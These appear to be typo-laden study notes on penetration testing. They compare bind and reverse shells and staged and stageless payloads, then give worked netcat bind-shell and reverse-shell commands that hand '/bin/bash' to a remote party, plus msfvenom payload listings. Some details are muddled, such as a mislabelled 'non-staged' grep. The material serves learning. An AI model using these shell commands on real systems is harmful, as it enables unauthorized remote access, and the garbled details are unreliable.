    FEATURES                     BIND SHELL                             REVERSE SHELL

1. connection        attecker connects to a  listening         target machine intiates a connection  
   initioation               port of target                           back to the attacker

2. listener          listner runs on the target machine        listner runs on the attacker's machine
   location 

3. comman use        often used for persistance and            commanly used for initial access and  
    case                    direct control                              bypassing firewalls

4. firewalls         more likely to be blocked by              can bypass firewalls as the target  
   bypass                      firewalls                                connects outwards  

5. ip address        attacker must know the victim's ip        attacker does not need to know the victim's
   requirement                   address                                     ip address

6. security          exposes a port on the target ,           less exposure since the connections is 
   implictions           making it vulnerable                        initiated by the target

7. typical          often uses tcp/udp directory on          frequently utilizes http/s or other comman    
   protocols               specified ports                       protocols to avoid detection


STAGE VS STAGELESS PAYLOADS

      FEATUES                  STAGED PAYLOADS                        NON-STAGED (STAGELESS) PAYLOAD 

1.  definition      composed of multiple parts, includes a      A self-contained packeg that includes     
                        stager and the final payload                   everything needed to execute

2. execution        required an initial stager to connect       executes in a singles step without needing 
    process             and download the final payload                to downloads additional components

3. file size        generally smaller due to the  seperation    typically larger since it contains all
                                 of stages                          necessary code in one executable

4. complexity       more complex due to multiple components     simpler as it is a single executable with
                                  and stages                           all  functionalities embedded

5. network          needs network connectivity for the stager   Can operate independently once executed, as      
   dependency             to retrieve the final payload         it does not require additional downloads

6. stelth and       more detectable due to multiple network     generally stealthier as it minimizes network
   detection          interactions and the presence of a             interactions and executes directly
                                    stager

EXAMPLE:
1. BIND SHELL

1st we have to create a backdore port in taget system 

TARGET SERVER:

└─$ nc -nvlp port -e /bin/bash

ex:
└─$ nc -nvlp 4444 -e /bin/bash

ATTACKER SYSTEM:
EXAMPLE:
┌──(kali㉿kali)-[~]
└─$ nc -v <target ip> <port>

ex:
┌──(kali㉿kali)-[~]
└─$ nc -v <192.168.29.150> <4444>
and it show open
now we can see when we want


2. REVERSE SHELL


1st we have listen in attacker system

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444   (4444 is port)


2nd we have to connect taget machine to port (4444) of attacker

└─$ nc <attacker ip> -e /bin/bash

after enter the attacker will be connected to taget machine


STAGED

┌──(kali㉿kali)-[~]
└─$ msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"


non-staged (STAGELESS)

┌──(kali㉿kali)-[~]
└─$ msfvenom -l payloads | grep "/meterpreter/reverse_tcp"

"/meterpreter/reverse_tcp"    is staged payload
"/meterpreter_reverse_tcp"    is non-staged payload
